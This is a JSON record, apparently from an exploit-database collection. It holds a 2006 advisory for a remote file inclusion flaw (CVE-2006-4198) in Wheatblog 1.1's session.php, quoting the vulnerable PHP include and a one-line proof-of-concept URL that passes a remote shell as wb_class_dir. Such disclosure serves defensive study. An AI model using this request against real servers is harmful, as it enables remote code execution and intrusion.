{
  "id": "2174",
  "title": "Wheatblog 1.1 - &#039;session.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-4198",
  "vuln_type": "rce",
  "code": "###########################################################################################\r\n#                                   Aria-Security.net Advisory                            #\r\n#                                 Discovered  by: O.U.T.L.A.W                             #\r\n#                                < www.Aria-security.net >                                #\r\n#                      Gr33t to: A.u.r.a  & l2odon & DrtRp & Sh3ll                        #              \r\n###########################################################################################\r\n\r\n\r\n<?php\r\ninclude_once(\"$wb_class_dir/classDatabase.php\");\r\n\r\n\r\nfunction Start_Session()\r\n{\r\n    global $session_dir;\r\n\r\n    if ( $session_dir != '' )\r\n        session_save_path($session_dir);\r\n\r\n    if ( ! isset($_SESSION) )\r\n    {\r\n        session_start();\r\n        // Supposedly a fix for IE6\r\n        header('Cache-control: private');\r\n        My_Cache();\r\n\r\n        if ( ! isset($_SESSION['db']) || gettype($_SESSION['db']->db) != 'resource')\r\n            touchDatabaseSession();\r\n\r\n    }\r\n}\r\n\r\n\r\n***********************************************************************\r\n\r\nProof of Concept:\r\nserver/includes/session.php?wb_class_dir=SHELL\r\n\r\nContact : Outlaw@aria-security.net\r\n\r\n# milw0rm.com [2006-08-11]",
  "url": "https://www.exploit-db.com/exploits/2174"
}